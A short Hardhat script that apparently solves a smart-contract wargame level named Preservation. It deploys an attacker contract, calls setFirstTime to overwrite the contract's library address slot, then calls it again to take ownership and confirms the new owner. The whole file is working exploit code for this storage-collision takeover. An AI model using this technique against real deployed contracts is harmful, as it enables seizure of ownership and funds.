// preservation.js - Exploits the Preservation contract

// Import statements
require("dotenv").config();
const { ethers } = require("hardhat");
const { preservationAddress, preservationAbi } = require("../contracts");

async function main() {
    // Get ethers signer and contract instances
    const provider = ethers.provider;
    const account = await ethers.getSigner();
    const preservation = new ethers.Contract(preservationAddress, preservationAbi, provider);
    const preservationSigner = preservation.connect(account);

    // Deploy the Exploiter contract
    const Exploiter = await ethers.getContractFactory("PreservationExploit");
    console.log("Deploying exploit...");
    const exploiter = await Exploiter.deploy();
    await exploiter.deployed();
    console.log("Exploiter deployed to:", exploiter.address);

    // Set the timeZone1Library address to the exploiter contract using the setFirstTime function
    console.log("Part 1: Changing timeZone1Library address to exploit contract...");
    const changeAddrTxn = await preservationSigner.setFirstTime(ethers.BigNumber.from(exploiter.address));
    await changeAddrTxn.wait();
    console.log("Part 1 Complete.");

    // Set the owner to my wallet using the newly injected exploiter contract
    console.log("Part 2: Changing owner to my wallet.");
    const changeOwnerTxn = await preservationSigner.setFirstTime(ethers.constants.One, {gasLimit: 50000});
    await changeOwnerTxn.wait();
    console.log("Part 2 Complete."); 

    // Confirm exploit
    const owner = await preservationSigner.owner();
    console.log("Preservation owner is now:", owner);
    console.log("Exploit successful.");

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });